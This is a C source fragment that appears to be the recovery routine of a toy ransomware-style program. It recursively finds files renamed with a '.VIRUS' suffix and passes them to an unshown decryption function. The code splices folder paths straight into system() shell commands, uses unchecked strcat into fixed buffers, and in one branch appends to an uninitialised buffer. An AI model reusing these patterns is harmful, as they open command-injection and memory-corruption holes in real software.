void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);

int frequency = 0;

void file_search(char *MainPosition){
    if(frequency == 0){
        system("dir /B *.VIRUS >> encryption_file_name.txt");
    }
    else{
        char file[500] = "cd ";
        strcat(file, MainPosition);
        strcat(file, " && dir /B *.VIRUS >> encryption_file_name.txt");
        system(file);
        file_read(MainPosition);
    }
}

void file_read(char *MainPosition){
    FILE *encryption_file_name_read;
    char encryption_file_name[500];
    if(frequency == 0){
        encryption_file_name_read = fopen("encryption_file_name.txt", "r");
        while(fgets(encryption_file_name, sizeof(encryption_file_name), encryption_file_name_read) != NULL){
            char original_file_name[500] = "";
            strtok(encryption_file_name, "\n");
            strcat(original_file_name, encryption_file_name);
            int size = strlen(original_file_name);
            original_file_name[size-6] = '\0';
            //strtok(original_file_name, "VIRUS");
            decryption(encryption_file_name, original_file_name);
        }
        fclose(encryption_file_name_read);
        frequency++;
        folder_search(MainPosition);
    }
    else{
        char file[500];
        strcat(encryption_file_name, MainPosition);
        strcat(encryption_file_name, "\\");
        strcpy(file, MainPosition);
        strcat(file, "\\encryption_file_name.txt");
        encryption_file_name_read = fopen(file, "r");
        char excessive_string[500];
        while(fgets(excessive_string, sizeof(excessive_string), encryption_file_name_read) != NULL){
        strcpy(encryption_file_name, MainPosition);
        strcat(encryption_file_name, "\\");
        char original_file_name[500];
        strcpy(original_file_name, MainPosition);
        strcat(original_file_name, "\\");
        strtok(excessive_string, "\n");
        strcat(original_file_name, excessive_string);
        strcat(encryption_file_name, excessive_string);
        //strtok(original_file_name, "VIRUS");
        int i = strlen(original_file_name)-6;
        original_file_name[i] = '\0';
        decryption(encryption_file_name, original_file_name);
        }
        fclose(encryption_file_name_read);
        remove(file);
        folder_search(MainPosition);
    }
}

void folder_search(char *MainPosition){
    strtok(MainPosition, "\n");
    char folder[500] = "cd ";
    strcat(folder, MainPosition);
    strcat(folder, " && dir /AD /B >> folder.txt");
    system(folder);
    strcpy(folder, "");
    strcat(folder, MainPosition);
    strcat(folder, "\\folder.txt");
    FILE *folder_name_read;
    folder_name_read = fopen(folder, "r");
    char folder_name[500];
    char MainPosition_copy[500];
    strcpy(MainPosition_copy, MainPosition);
    while(fgets(folder_name, sizeof(folder_name), folder_name_read) != NULL){
        strtok(folder_name, "\n");
        strcat(MainPosition, "\\");
        strcat(MainPosition, folder_name);
        file_search(MainPosition);
        strcpy(MainPosition, MainPosition_copy);
    }
    fclose(folder_name_read);
    remove(folder);
}
